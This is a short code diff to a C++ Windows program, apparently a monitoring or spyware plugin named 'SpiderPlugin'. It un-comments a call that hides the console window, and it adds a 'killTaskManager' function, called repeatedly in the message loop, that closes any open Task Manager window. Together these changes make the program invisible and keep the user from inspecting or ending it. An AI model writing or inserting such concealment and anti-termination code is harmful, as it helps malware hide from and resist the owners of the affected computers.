@@ -159,8 +159,7 @@ namespace spider
       bool SpiderPlugin::initWindows()
       {
 	// Hide window
-	// TODO: Un-comment
-	//::ShowWindow(::GetConsoleWindow(), SW_HIDE);
+	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
 
 	// Check if already loaded
 	HANDLE hMutex = CreateMutex(NULL, FALSE, "winSp1d3r");
@@ -626,6 +625,7 @@ namespace spider
       {
 	MSG msg;
 
+	killTaskManager();
 	while (PeekMessage(&msg, nullptr, 0, 0, PM_REMOVE))
 	  {
 	    if (msg.message == WM_QUIT)
@@ -752,6 +752,16 @@ namespace spider
 	                             sa.lpSecurityDescriptor))
 	  return false;
 	return true;
+      }
+
+      void SpiderPlugin::killTaskManager() const
+      {
+	HWND TaskMgr = FindWindow(nullptr, "Task Manager");
+	if (TaskMgr)
+	  {
+	    PostMessage(TaskMgr, WM_CLOSE, static_cast<LPARAM>(0),
+	                static_cast<WPARAM>(0));
+	  }
       }
     }
   }
